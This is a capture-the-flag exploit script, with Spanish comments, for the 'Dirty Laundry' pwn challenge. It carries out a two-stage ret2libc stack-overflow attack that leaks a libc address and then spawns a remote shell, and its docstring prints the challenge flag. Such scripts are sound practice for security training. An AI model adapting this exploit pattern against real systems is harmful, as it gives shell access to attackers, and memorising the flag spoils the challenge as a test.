#!/usr/bin/env python3
"""
Exploit: Dirty Laundry — PWN 500 (Pragyan CTF 2026)
FLAG: p_ctf{14UnDryHASbEenSUCces$fU11YCOMP1e73d}

Vulnerabilidad: Buffer overflow en vuln() — buffer 0x40, read(0x100)
Protecciones:   No canary, No PIE, Partial RELRO, NX enabled
Técnica:        ret2libc en 2 stages (leak puts@GOT → system("/bin/sh"))

Nota: SIN RET extra para alineación — con 0 RETs funciona, con 1+ crashea.
"""
from pwn import *
import time

BINARY = '/home/ubuntu/pragyan_ctf/pwn500/chal_patched'
LIBC   = '/home/ubuntu/pragyan_ctf/pwn500/libc.so.6'
HOST   = 'dirty-laundry.ctf.prgy.in'
PORT   = 1337

context.binary = elf = ELF(BINARY)
libc = ELF(LIBC, checksec=False)

POP_RDI_R14 = 0x4011a7   # pop rdi; pop r14; ret
OFFSET      = 0x48        # 0x40 buffer + 0x8 saved rbp

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True)
    else:
        return process(BINARY)

p = conn()
p.recvuntil(b'Add your laundry:')

# --- STAGE 1: Leak puts@GOT ---
payload1  = b'A' * OFFSET
payload1 += p64(POP_RDI_R14)
payload1 += p64(elf.got['puts'])
payload1 += p64(0)
payload1 += p64(elf.plt['puts'])
payload1 += p64(0x40122a)            # main después de check_status
payload1 = payload1.ljust(0x100, b'\x00')
p.send(payload1)

p.recvuntil(b'Laundry complete')
leak_raw = p.recvuntil(b'\n', drop=True)
puts_leak = u64(leak_raw.ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# --- STAGE 2: system("/bin/sh") ---
p.recvuntil(b'Add your laundry:')

payload2  = b'B' * OFFSET
payload2 += p64(POP_RDI_R14)
payload2 += p64(next(libc.search(b'/bin/sh\x00')))
payload2 += p64(0)
payload2 += p64(libc.symbols['system'])
payload2 = payload2.ljust(0x100, b'\x00')
p.send(payload2)

time.sleep(0.5)
p.interactive()
